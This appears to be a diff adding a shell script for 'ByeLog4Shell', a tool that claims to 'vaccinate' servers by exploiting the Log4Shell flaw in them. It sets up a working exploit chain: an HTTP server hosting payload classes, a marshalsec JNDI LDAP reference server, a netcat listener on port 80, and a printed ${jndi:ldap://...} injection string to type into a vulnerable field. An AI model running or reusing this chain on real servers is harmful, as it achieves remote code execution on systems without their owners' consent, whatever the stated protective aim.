@@ -1,0 +1,136 @@
+#!/bin/sh
+
+die() {
+    printf "%s\n" "$1" >&2
+    exit 1
+}
+usage() {                                 
+  echo "Usage:  $0 -h | --help | Display This Usage Page
+  	$0 -i | --install | Install ByeLog4Shell and its Dependencies
+        $0 -rp | --run-persistent | Run ByeLog4Shell in Persistent mode (Keep in mind to first Install the Script or it doesnt Work)
+        $0 -rt | --run-transient | Run ByeLog4Shell in Transient mode (Keep in mind to first Install the Script or it doesnt Work)
+        $0 -irt | --install-run-transient | Install and run ByeLog4Shell in Transient mode
+        $0 -irp | --install-run-persistent | Install and run ByeLog4Shell in Persistent mode" 1>&2 
+}
+exit_abnormal() {                        
+  usage
+  exit 1
+}
+install-runp() {
+echo Installing and Running ByeLog4Shell in Persistent Mode
+sudo apt install -y maven netcat-traditional gnome-terminal
+cd ByeLog4ShellVaccinator
+mvn package
+cd ..
+cd byelog4shellserver
+mvn package -DskipTests
+cd ..
+cd ByeLog4ShellVaccinator/target/classes
+gnome-terminal -- python3 -m http.server 8888
+cd ..
+cd ..
+cd ..
+cd byelog4shellserver/target
+gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCEPersistent
+gnome-terminal -- nc -lvnp 80
+echo "Now enter "\${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a}" into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
+exit
+}
+install-runt() {
+echo Installing and Running ByeLog4Shell in Transient Mode
+sudo apt install -y maven netcat-traditional gnome-terminal
+cd ByeLog4ShellVaccinator
+mvn package
+cd ..
+cd byelog4shellserver
+mvn package -DskipTests
+cd ..
+cd ByeLog4ShellVaccinator/target/classes
+gnome-terminal -- python3 -m http.server 8888
+cd ..
+cd ..
+cd ..
+cd byelog4shellserver/target
+gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCETransient
+gnome-terminal -- nc -lvnp 80
+echo "Now enter \${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a} into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
+exit
+}
+installb() {
+echo Installing Dependencies for ByeLog4Shell
+sudo apt install -y maven netcat-traditional gnome-terminal
+cd ByeLog4ShellVaccinator
+mvn package
+cd ..
+cd byelog4shellserver
+mvn package -DskipTests
+cd ..
+}
+runt() {
+echo Running ByeLog4Shell in Transient Mode
+cd ByeLog4ShellVaccinator/target/classes
+gnome-terminal -- python3 -m http.server 8888
+cd ..
+cd ..
+cd ..
+cd byelog4shellserver/target
+gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCETransient
+gnome-terminal -- nc -lvnp 80
+echo "Now enter \${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a} into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
+exit
+}
+runp() {
+echo Running ByeLog4Shell in Persistent Mode
+cd ByeLog4ShellVaccinator/target/classes
+gnome-terminal -- python3 -m http.server 8888
+cd ..
+cd ..
+cd ..
+cd byelog4shellserver/target
+gnome-terminal -- java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://0.0.0.0:8888/#Log4jRCETransient
+gnome-terminal -- nc -lvnp 80
+echo "Now enter \${jndi:ldap://$(dig +short myip.opendns.com @resolver1.opendns.com):1389/a} into a vulnerable field (such as user name) to Vaccinate a Server against Log4Shell Vulnerability"
+exit
+}
+while :; do
+    case $1 in
+        -h|-\?|--help)
+        echo ByeLog4Shell By Qerim Iseni09
+        usage
+            exit
+            ;;
+	 -i|--install)
+	echo ByeLog4Shell By Qerim Iseni09
+        installb
+            exit
+            ;;
+        -rp|--run-persistence)
+        echo ByeLog4Shell By Qerim Iseni09
+        runp
+            exit
+            ;;
+        -rt|--run-transient)
+        runt
+            exit
+            ;;
+        -irt|--install-run-transient)
+        echo ByeLog4Shell By Qerim Iseni09
+        install-runt
+            exit
+            ;;
+        -irp|--install-run-persistent)
+        echo ByeLog4Shell By Qerim Iseni09
+        install-runp
+            exit
+            ;;
+        -?*)
+        echo ByeLog4Shell By Qerim Iseni09
+            printf "WARN: Unknown option (ignored): %s\n" "$1" >&2
+            ;;
+        *)               
+           usage
+            break
+    esac
+
+    shift
+done
